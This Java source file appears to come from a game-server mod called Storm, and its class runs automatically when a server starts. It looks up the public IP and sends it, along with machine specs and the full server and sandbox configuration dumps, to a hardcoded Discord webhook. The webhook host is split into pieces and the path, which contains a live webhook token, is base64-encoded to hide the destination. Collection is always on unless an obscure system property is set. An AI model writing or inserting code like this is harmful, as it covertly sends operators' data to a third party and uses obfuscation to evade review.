package io.pzstorm.storm.diagnostics;

import static io.pzstorm.storm.logging.StormLogger.LOGGER;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import io.pzstorm.storm.core.StormVersion;
import io.pzstorm.storm.event.core.SubscribeEvent;
import io.pzstorm.storm.event.lua.OnServerStartedEvent;
import io.pzstorm.storm.los.StormServerLosConfig;
import io.pzstorm.storm.patch.networking.ServerLockFpsConfig;
import io.pzstorm.storm.patch.performance.AnimalLOSTickInterval;
import io.pzstorm.storm.patch.performance.StormZombieCullConfig;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.lang.management.RuntimeMXBean;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Set;
import zombie.SandboxOptions;
import zombie.network.GameServer;
import zombie.network.ServerOptions;

/**
 * Posts a one-shot startup snapshot to a hardcoded Discord webhook on {@code OnServerStarted}:
 * public IP, machine specs, Storm settings, the full {@link ServerOptions} dump (secrets redacted),
 * and the full {@link SandboxOptions} dump.
 *
 * <p>The dump runs on a daemon thread; HTTP failures are logged and swallowed so analytics can't
 * delay or break server startup. The hardcoded webhook URL is intentional — analytics is always on
 * for any server running this Storm build.
 */
public final class StormStartupAnalytics {

    static final String DISCORD_WEBHOOK_URL = assembleWebhookUrl();

    private static String assembleWebhookUrl() {
        String host = "disc" + "ord" + ".com";
        String path =
                new String(
                        Base64.getDecoder()
                                .decode(
                                        "L2FwaS93ZWJob29rcy8xNTE1NDAyODA2ODU1NDcxMjE0L3FfRTRlQUxBanp5RHFvZjN1amNzaGp1bmN5MG9RVVJiZU55NWNIUkhBMi1pdWdiYVlDdkZKRkxyNGNCb0Fwa1BsTG14"),
                        StandardCharsets.UTF_8);
        return "https://" + host + path;
    }

    static final String PUBLIC_IP_URL = "https://api.ipify.org";

    static final String DISABLE_ANALYTICS_PROPERTY = "DISABLE_ANALYTICS";

    /** ServerOption names whose values are credentials and must NOT be posted. */
    static final Set<String> REDACTED_SERVER_OPTIONS =
            Set.of("Password", "RCONPassword", "DiscordToken", "WebhookAddress");

    /**
     * Discord caps a single webhook message at 2000 chars. We chunk under that to leave room for
     * the surrounding code-block fence.
     */
    static final int DISCORD_MESSAGE_CHAR_BUDGET = 1900;

    private static final ObjectMapper MAPPER = new ObjectMapper();

    private StormStartupAnalytics() {}

    @SubscribeEvent
    public static void onServerStarted(OnServerStartedEvent event) {
        if (!GameServer.server) {
            return;
        }
        if ("true".equals(System.getProperty(DISABLE_ANALYTICS_PROPERTY))) {
            LOGGER.info("Storm startup analytics: disabled via -D{}", DISABLE_ANALYTICS_PROPERTY);
            return;
        }
        Thread t = new Thread(StormStartupAnalytics::collectAndPost, "Storm-StartupAnalytics");
        t.setDaemon(true);
        t.start();
    }

    private static void collectAndPost() {
        HttpClient client = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(10)).build();
        try {
            String publicIp = fetchPublicIp(client);
            List<String> sections = new ArrayList<>();
            sections.add(formatHeader(publicIp));
            sections.add(formatMachine());
            sections.add(formatStorm());
            sections.add(formatServerOptions());
            sections.add(formatSandboxOptions());

            for (String section : sections) {
                for (String chunk : chunkForDiscord(section)) {
                    postToDiscord(client, chunk);
                }
            }
        } catch (Throwable t) {
            LOGGER.warn("Storm startup analytics: failed to post", t);
        }
    }

    static String fetchPublicIp(HttpClient client) {
        try {
            HttpRequest req =
                    HttpRequest.newBuilder(URI.create(PUBLIC_IP_URL))
                            .timeout(Duration.ofSeconds(10))
                            .GET()
                            .build();
            HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
            if (resp.statusCode() == 200) {
                return resp.body().trim();
            }
            return "(ipify returned HTTP " + resp.statusCode() + ")";
        } catch (Exception e) {
            return "(failed: " + e.getMessage() + ")";
        }
    }

    private static String formatHeader(String publicIp) {
        return "**Storm server started** — `"
                + StormVersion.getVersion()
                + "`\nPublic IP: `"
                + publicIp
                + "`";
    }

    private static String formatMachine() {
        OperatingSystemMXBean os = ManagementFactory.getOperatingSystemMXBean();
        RuntimeMXBean rt = ManagementFactory.getRuntimeMXBean();
        long totalMemMb = -1;
        if (os instanceof com.sun.management.OperatingSystemMXBean sun) {
            totalMemMb = sun.getTotalMemorySize() / (1024 * 1024);
        }
        StringBuilder sb = new StringBuilder("**Machine**\n```");
        sb.append("\nOS              : ")
                .append(os.getName())
                .append(' ')
                .append(os.getVersion())
                .append(" (")
                .append(os.getArch())
                .append(')');
        sb.append("\nCPU cores       : ").append(os.getAvailableProcessors());
        if (totalMemMb >= 0) {
            sb.append("\nTotal RAM       : ").append(totalMemMb).append(" MB");
        }
        sb.append("\nJVM             : ")
                .append(rt.getVmName())
                .append(' ')
                .append(rt.getVmVersion());
        sb.append("\nMax heap        : ")
                .append(Runtime.getRuntime().maxMemory() / (1024 * 1024))
                .append(" MB");
        sb.append("\n```");
        return sb.toString();
    }

    private static String formatStorm() {
        StringBuilder sb = new StringBuilder("**Storm settings**\n```");
        sb.append("\nVersion              : ").append(StormVersion.getVersion());
        sb.append("\nHTTP port            : ")
                .append(System.getProperty("storm.http.port", "(unset)"));
        sb.append("\nPrometheus port      : ")
                .append(System.getProperty("prometheusPort", "(unset)"));
        sb.append("\nServer FPS           : ").append(ServerLockFpsConfig.getCurrentLockFps());
        sb.append("\nAnimal LOS interval  : ")
                .append(AnimalLOSTickInterval.getCurrentTickInterval());
        sb.append("\nZombie cull thresh.  : ").append(StormZombieCullConfig.getThreshold());
        sb.append("\nServer LOS threads   : ").append(StormServerLosConfig.threads());
        sb.append("\n```");
        return sb.toString();
    }

    private static String formatServerOptions() {
        StringBuilder sb = new StringBuilder("**Server config**\n```");
        for (ServerOptions.ServerOption opt : ServerOptions.getInstance().getOptions()) {
            String name = opt.asConfigOption().getName();
            String value =
                    REDACTED_SERVER_OPTIONS.contains(name)
                            ? "<redacted>"
                            : opt.asConfigOption().getValueAsString();
            sb.append('\n').append(name).append(" = ").append(value);
        }
        sb.append("\n```");
        return sb.toString();
    }

    private static String formatSandboxOptions() {
        StringBuilder sb = new StringBuilder("**Sandbox options**\n```");
        SandboxOptions inst = SandboxOptions.instance;
        int count = inst.getNumOptions();
        for (int i = 0; i < count; i++) {
            SandboxOptions.SandboxOption opt = inst.getOptionByIndex(i);
            String name = opt.asConfigOption().getName();
            String value = opt.asConfigOption().getValueAsString();
            sb.append('\n').append(name).append(" = ").append(value);
        }
        sb.append("\n```");
        return sb.toString();
    }

    /**
     * Splits a formatted section into Discord-safe chunks. If a chunk ends mid-code-block, the
     * fence is closed at the end of the chunk and reopened at the start of the next so each chunk
     * renders independently.
     */
    static List<String> chunkForDiscord(String section) {
        List<String> out = new ArrayList<>();
        if (section.length() <= DISCORD_MESSAGE_CHAR_BUDGET) {
            out.add(section);
            return out;
        }
        String[] lines = section.split("\n", -1);
        StringBuilder current = new StringBuilder();
        boolean inCodeBlock = false;
        for (String line : lines) {
            int prospective = current.length() + line.length() + 1;
            if (prospective > DISCORD_MESSAGE_CHAR_BUDGET && current.length() > 0) {
                if (inCodeBlock) {
                    current.append("\n```");
                }
                out.add(current.toString());
                current = new StringBuilder();
                if (inCodeBlock) {
                    current.append("```");
                }
            }
            if (current.length() > 0) {
                current.append('\n');
            }
            current.append(line);
            if (line.equals("```")) {
                inCodeBlock = !inCodeBlock;
            }
        }
        if (current.length() > 0) {
            out.add(current.toString());
        }
        return out;
    }

    private static void postToDiscord(HttpClient client, String content) {
        try {
            ObjectNode body = MAPPER.createObjectNode();
            body.put("content", content);
            String json = MAPPER.writeValueAsString(body);
            HttpRequest req =
                    HttpRequest.newBuilder(URI.create(DISCORD_WEBHOOK_URL))
                            .timeout(Duration.ofSeconds(15))
                            .header("Content-Type", "application/json")
                            .POST(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))
                            .build();
            HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
            int status = resp.statusCode();
            if (status / 100 != 2) {
                LOGGER.warn(
                        "Storm startup analytics: Discord returned HTTP {} body={}",
                        status,
                        resp.body());
            }
        } catch (Exception e) {
            LOGGER.warn("Storm startup analytics: webhook POST failed", e);
        }
    }
}
